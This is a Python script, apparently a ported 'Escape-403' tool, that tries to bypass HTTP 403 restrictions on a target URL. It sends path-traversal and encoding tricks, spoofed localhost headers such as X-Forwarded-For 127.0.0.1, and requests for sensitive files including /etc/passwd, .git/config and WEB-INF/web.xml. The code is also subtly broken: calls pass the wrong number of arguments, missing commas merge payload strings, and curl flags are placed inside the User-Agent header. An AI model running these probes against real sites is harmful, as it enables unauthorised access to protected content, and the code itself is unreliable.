import sys
import subprocess
import requests
import argparse
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to display banner
def show_banner():
    print("============================")
    subprocess.run(["figlet", "-f", "standard", "Escape-403"])
    print("                                                -Loki-404")
    print("============================")
    print(f"Usage: {sys.argv[0]} <url> <path> [-f <file>|--file <file>] [-w|--no-wayback] [-s|--success-only] [-h|--help]")

# Function to display help
def show_help():
    show_banner()
    print()
    print("Options:")
    print("  -w, --no-wayback   : Skip Wayback Machine URL check")
    print("  -s, --success-only : Show only successful responses (status code 200)")
    print("  -f, --file <file>  : Specify a file containing multiple paths")
    print("  -h, --help         : Show this help message")
    sys.exit(0)

# Function to perform a test and display results
def test_bypass(url, path, option, header):
    result = requests.get(f"{url}/{path}{option}", headers={"User-Agent": header}, verify=False, allow_redirects=False)
    result_info = f"{result.status_code},{len(result.content)}"

    if success_only and result.status_code != 200:
        return

    print(f"  [+] Requested URL: {url}/{path}{option}")
    print(f"  --> Header: {header}")
    print(f"  --> Result: {result_info}")

    # Highlight responses with a 200 status code
    if result.status_code == 200:
        print("\033[92m  --> Status Code: 200\033[0m")
        print("")
    else:
        print()

# Main script
def main():
    global url, path, show_wayback, success_only

    parser = argparse.ArgumentParser(description="Test for 403 Bypass on a given URL and path.")
    parser.add_argument("url", help="The URL to test")
    parser.add_argument("path", help="The path to test")
    parser.add_argument("-w", "--no-wayback", action="store_true", help="Skip Wayback Machine URL check")
    parser.add_argument("-s", "--success-only", action="store_true", help="Show only successful responses (status code 200)")
    parser.add_argument("-f", "--file", help="Specify a file containing multiple paths")
    args = parser.parse_args()

    url, path, show_wayback, success_only = args.url, args.path, not args.no_wayback, args.success_only

    # Display banner
    show_banner()

    # Check if the file option is provided
    if args.file:
        with open(args.file, "r") as file:
            paths = [line.strip() for line in file.readlines()]

        for path_entry in paths:
            print(f"Testing for 403 Bypass on {url}/{path_entry}")
            print()
            # Perform tests and display results for each
            test_bypass("", "")
            test_bypass("/%2e/", "")
            test_bypass(f"/{path}/.", "")
            test_bypass(f"//{path}//", "")
            test_bypass(f"/./{path}/./", "")
            test_bypass(f"/{path}", f"-H X-Original-URL: {path}")
            test_bypass(f"/{path}", "-H X-Custom-IP-Authorization: 127.0.0.1")
            test_bypass(f"/{path}", "-H X-Forwarded-For: http://127.0.0.1")
            test_bypass(f"/{path}", "-H X-Forwarded-For: 127.0.0.1:80")
            test_bypass("", f"-H X-rewrite-url: {path}")
            test_bypass(f"/{path}%20", "")
            test_bypass(f"/{path}%09", "")
            test_bypass(f"/{path}?" "")
            test_bypass(f"/{path}.html" "")
            test_bypass(f"/{path}/?anything" "")
            test_bypass(f"/{path}#" "")
            test_bypass(f"/{path}" "-H Content-Length:0 -X POST")
            test_bypass(f"/{path}/*" "")
            test_bypass(f"/{path}.php" "")
            test_bypass(f"/{path}.json" "")
            test_bypass(f"/{path}" "-X TRACE")
            test_bypass(f"/{path}" "-H X-Host: 127.0.0.1")
            test_bypass(f"/{path}..;/" "")
            test_bypass(f"/{path};/" "")
            test_bypass("","-X TRACE")
            test_bypass(f"/{path}/..;/etc/passwd" "")
            test_bypass(f"/{path}/~" "")
            test_bypass(f"/{path}/~index.html" "")
            test_bypass(f"/{path}/.git/config" "")
            test_bypass(f"/{path}/WEB-INF/web.xml" "")
            test_bypass(f"/{path}/WEB-INF/" "")
            test_bypass(f"/{path}/.svn/entries" "")
            test_bypass(f"/{path}/.DS_Store" "")
            test_bypass(f"/{path}/%252e" "")
            test_bypass(f"/{path}/.%252e" "")
            test_bypass(f"/{path}/.%2e" "")
            test_bypass(f"/{path}/.%2e%2e" "")
            test_bypass(f"/{path}/.%252e%252e" "")
            test_bypass(f"/{path}/..../////" "")
            test_bypass(f"/{path}/.htaccess" "")
            # ... (continue with other test cases)

    else:
        print(f"Testing for 403 Bypass on {url}/{path}")
        print()
        # Perform tests and display results for each
        test_bypass(url, path, "", "")
        test_bypass(url, path, "/%2e/", "")
        test_bypass(url, path, f"/{path}/.", "")
        # ... (continue with other test cases)

    # Wayback Machine check
    if show_wayback:
        print("Wayback Machine:")
        wayback_result = requests.get(f"https://archive.org/wayback/available?url={url}/{path}").json()
        if "closest" in wayback_result["archived_snapshots"]:
            available = wayback_result["archived_snapshots"]["closest"]["available"]
            wayback_url = wayback_result["archived_snapshots"]["closest"]["url"]
            print(f"  --> Requested URL: {url}/{path}")
            print(f"  --> Wayback Machine Result: Available: {available}, URL: {wayback_url}")
        else:
            print(f"  --> Requested URL: {url}/{path}")
            print("  --> Wayback Machine Result: Not available")

if __name__ == "__main__":
    main()
